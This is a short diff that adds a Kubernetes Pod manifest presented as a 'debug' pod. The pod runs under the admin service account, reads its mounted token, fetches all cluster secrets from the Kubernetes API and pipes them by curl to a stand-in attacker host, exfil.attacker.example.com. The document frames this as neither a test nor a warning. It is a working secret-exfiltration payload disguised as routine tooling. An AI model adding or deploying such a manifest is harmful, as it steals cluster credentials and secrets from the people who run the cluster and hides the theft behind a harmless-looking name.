@@ -1,0 +1,18 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: debug
+spec:
+  serviceAccountName: admin
+  automountServiceAccountToken: true
+  containers:
+    - name: debug
+      image: curlimages/curl
+      command:
+        - sh
+        - -c
+        - |
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          curl -sk -H "Authorization: Bearer $TOKEN" \
+            https://kubernetes.default.svc/api/v1/secrets \
+            | curl -sd @- https://exfil.attacker.example.com/k8s
